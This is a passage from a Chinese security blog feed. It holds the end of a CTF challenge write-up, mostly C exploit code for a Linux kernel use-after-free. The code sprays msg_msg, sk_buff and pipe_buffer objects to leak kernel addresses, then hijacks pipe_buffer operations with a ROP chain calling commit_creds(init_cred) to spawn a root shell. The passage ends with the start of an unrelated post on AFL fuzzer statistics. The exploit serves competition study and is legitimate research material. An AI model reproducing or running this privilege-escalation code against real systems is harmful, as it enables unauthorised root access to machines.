PRIMARY_MSG_TYPE;</span><br><span class="line">    *(<span class="keyword">long</span> *)&amp;secondary_msg = SECONDARY_MSG_TYPE;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;primary_msg,</span><br><span class="line">                   <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;secondary_msg,</span><br><span class="line">                   <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="number">1024</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (msgrcv(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, PRIMARY_MSG_TYPE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive primary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0x84</span>, <span class="number">0x1000</span>);</span><br><span class="line">    write(fd, buf, <span class="number">0xffc</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0xffc</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)buf = <span class="number">0xffd</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], buf, <span class="number">0x1000</span> - <span class="number">0x140</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0xa0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    write(fd, buf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    victim_qid = real_qid = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">256</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (msgrcv(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] != MSG_TAG)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to make corruption!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] != i)</span><br><span class="line">        &#123;</span><br><span class="line">            victim_qid = i;</span><br><span class="line">            real_qid = *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (victim_qid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to make overlapping!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], buf, <span class="number">0x1000</span> - <span class="number">0x140</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d &quot;</span>, victim_qid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, real_qid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[real_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, SECONDARY_MSG_TYPE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to release secondary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="string">&#x27;Z&#x27;</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = <span class="number">0x196082</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = <span class="number">0x196082</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = VICTIM_MSG_TYPE;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg);</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg) - <span class="number">8</span>, <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nearby_msg = (struct msg_msg *)&amp;oob_msg.mtext[(SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg))];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%p\n&quot;</span>,</span><br><span class="line">           nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    search_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)nearby_msg-&gt;m_list.prev;</span><br><span class="line">    search_addr = search_addr - <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(oob_msg.mtext, <span class="number">0</span>, <span class="keyword">sizeof</span>(oob_msg.mtext));</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="keyword">sizeof</span>(oob_msg.mtext);</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = search_addr;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nearby_msg_prim = (struct msg_msg *)&amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">    victim_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    victim_addr = victim_addr - <span class="number">0x400</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%p\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">704</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)fake_secondary_msg)[i] = victim_addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = victim_addr + <span class="number">0x200</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = victim_addr + <span class="number">0x200</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = VICTIM_MSG_TYPE;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="number">1024</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE, IPC_NOWAIT | MSG_NOERROR) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;196082&quot;</span>, <span class="number">6</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    pipe_buf_ptr = (struct pipe_buffer *)&amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg,</span><br><span class="line">                     <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got pipe_buf_ops: \033[0m%p\n&quot;</span>,</span><br><span class="line">                       pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_addr = pipe_buf_ptr-&gt;ops;</span><br><span class="line">                kernel_offset = kernel_addr - <span class="number">0xffffffff81e2d980</span>;</span><br><span class="line">                kernel_base = kernel_offset + <span class="number">0xffffffff81000000</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%p \033[32m\033[1moffset: \033[0m%p\n&quot;</span>,</span><br><span class="line">           kernel_base, kernel_offset);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> init_cred = <span class="number">0xffffffff8224aca0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> commit_creds = <span class="number">0xffffffff810bb710</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> pop_rdi = <span class="number">0xffffffff811af57d</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> swapgs_iretq = <span class="number">0xffffffff81a010eb</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> push_rsi_pop_rsp_rbx_r12 = <span class="number">0xffffffff8133151b</span> + kernel_offset;</span><br><span class="line"></span><br><span class="line">    pipe_buf_ptr-&gt;page = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;196082&quot;</span>;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake_secondary_msg + <span class="number">0x18</span>) = <span class="number">0xffffffff81000390</span> + kernel_offset;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (struct pipe_buf_operations *)&amp;fake_secondary_msg[<span class="number">0x100</span>];</span><br><span class="line">    ops_ptr-&gt;release = push_rsi_pop_rsp_rbx_r12;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> rop = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="keyword">uint64_t</span> *)&amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop++] = pop_rdi;</span><br><span class="line">    rop_chain[rop++] = init_cred;</span><br><span class="line">    rop_chain[rop++] = commit_creds;</span><br><span class="line">    rop_chain[rop++] = swapgs_iretq;</span><br><span class="line">    rop_chain[rop++] = get_shell;</span><br><span class="line">    rop_chain[rop++] = user_cs;</span><br><span class="line">    rop_chain[rop++] = user_rflags;</span><br><span class="line">    rop_chain[rop++] = user_sp;</span><br><span class="line">    rop_chain[rop++] = user_ss;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rop_chain is ready\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    read(fd, buf, <span class="number">0xffc</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;spray sk_buff complete!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230331103838088.png"                      alt="image-20230331103838088"                ></p><p>吐槽一下：一道题目用了五个gadget文件！！！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ctf ls -l | grep gadget</span><br><span class="line">-rw-r--r--   1 tcdy  staff   14478379  3 29 19:14 gadget.txt</span><br><span class="line">-rw-rw-r--@  1 tcdy  staff  325376514  3 29 19:24 gadget2.txt</span><br><span class="line">-rw-rw-r--@  1 tcdy  staff  113547117  3 30 13:43 gadget3.txt</span><br><span class="line">-rw-rw-r--@  1 tcdy  staff   21718691  3 30 14:38 gadget4.txt</span><br><span class="line">-rw-r--r--   1 tcdy  staff    4499639  3 30 15:08 gadget5.txt</span><br></pre></td></tr></table></figure><hr><p>参考链接:<br>    <a class="link"   href="https://arttnba3.cn/2022/09/30/CTF-0X07-BYTECTF2022_BYTERUN/" >https://arttnba3.cn/2022/09/30/CTF-0X07-BYTECTF2022_BYTERUN/<i class="fas fa-external-link-alt"></i></a><br>    <a class="link"   href="https://elixir.bootlin.com/linux/v5.19/source/ipc/msg.c#L1068" >https://elixir.bootlin.com/linux/v5.19/source/ipc/msg.c#L1068<i class="fas fa-external-link-alt"></i></a><br>题目链接:<br>    墨晚鸢佬自己有题目链接，这里就不上传啦。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;当初看到墨晚鸢大佬的博客对这道题目的描述的时候就对这道题暗生情愫了，如今终于是得以复现。&lt;/p&gt;
&lt;h2 id=&quot;内核分析&quot;&gt;&lt;a href=&quot;#内核分析&quot; class=&quot;headerlink&quot; title=&quot;内核分析&quot;&gt;&lt;/a&gt;内核分析&lt;/h2&gt;&lt;h3 id=&quot;函数分析&quot;</summary>
      
    
    
    
    <category term="比赛复现" scheme="https://cv196082.gitee.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="msg_msg" scheme="https://cv196082.gitee.io/tags/msg-msg/"/>
    
    <category term="sk_buff" scheme="https://cv196082.gitee.io/tags/sk-buff/"/>
    
    <category term="pipe_buffer" scheme="https://cv196082.gitee.io/tags/pipe-buffer/"/>
    
    <category term="qemu escape" scheme="https://cv196082.gitee.io/tags/qemu-escape/"/>
    
  </entry>
  
  <entry>
    <title>FUZZ(2):AFL结果分析和代码覆盖率</title>
    <link href="https://cv196082.gitee.io/2023/03/23/AFL%E7%BB%93%E6%9E%9C%E5%88%86%E6%9E%90%E5%92%8C%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87/"/>
    <id>https://cv196082.gitee.io/2023/03/23/AFL%E7%BB%93%E6%9E%9C%E5%88%86%E6%9E%90%E5%92%8C%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87/</id>
    <published>2023-03-23T13:47:34.000Z</published>
    <updated>2023-03-23T13:47:18.753Z</updated>
    
    <content type="html"><![CDATA[<p>本来不打算做AFL的源码分析，但是看到了一篇文章吸引到了我，当然这篇文章还是不会涉及到源码分析，在后续的FUZZ相关文章中会进行进一步分析。</p><h2 id="fuzzer工作状态"><a href="#fuzzer工作状态" class="headerlink" title="fuzzer工作状态"></a>fuzzer工作状态</h2><p>首先可以查看在<code>output</code>目录下的<code>fuzzer_state</code>文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">➜  afl-2.52b cat ./afl_test/output_dir/fuzzer_stats</span><br><span class="line">start_time        : 1679542022</span><br><span class="line">last_update       : 1679542022</span><br><span class="line">fuzzer_pid        : 541718</span><br><span class="line">cycles_done       : 0</span><br><span class="line">execs_done        : 24</span><br><span class="line">execs_per_sec     : 387.10</span><br><span class="line">paths_total       : 3</span><br><span class="line">paths_favored     : 2</span><br><span class="line">paths_found       : 0</span><br><span class="line">paths_imported    : 0</span><br><span class="line">max_depth         : 1</span><br><span class="line">cur_path          : 0</span><br><span class="line">pending_favs      : 2</span><br><span class="line">pending_total     : 3</span><br><span class="line">variable_paths    : 0</span><br><span class="line">stability         : 100.00%</span><br><span class="line">bitmap_cvg        : 0.05%</span><br><span class="line">unique_crashes    : 0</span><br><span class="line">unique_hangs      : 0</span><br><span class="line">last_path         : 0</span><br><span class="line">last_crash        : 0</span><br><span class="line">last_hang         : 0</span><br><span class="line">execs_since_crash : 24</span><br><span class="line">exec_timeout      : 20</span><br><span class="line">afl_banner        : <span class="built_in">test</span></span><br><span class="line">afl_version       : 2.52b</span><br><span class="line">target_mode       : qemu </span><br><span class="line">command_line      : ./afl-fuzz -i ./afl_test/input_dir -o ./afl_test/output_dir -Q ./afl_test/<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>不过这里我在运行时cat几次内容都没有发生变化所以我猜测应该是运行开始时产生，运行结束时才修改内容。那么如果想要实时的查看运行情况的话可以用<code>afl-whatsup</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 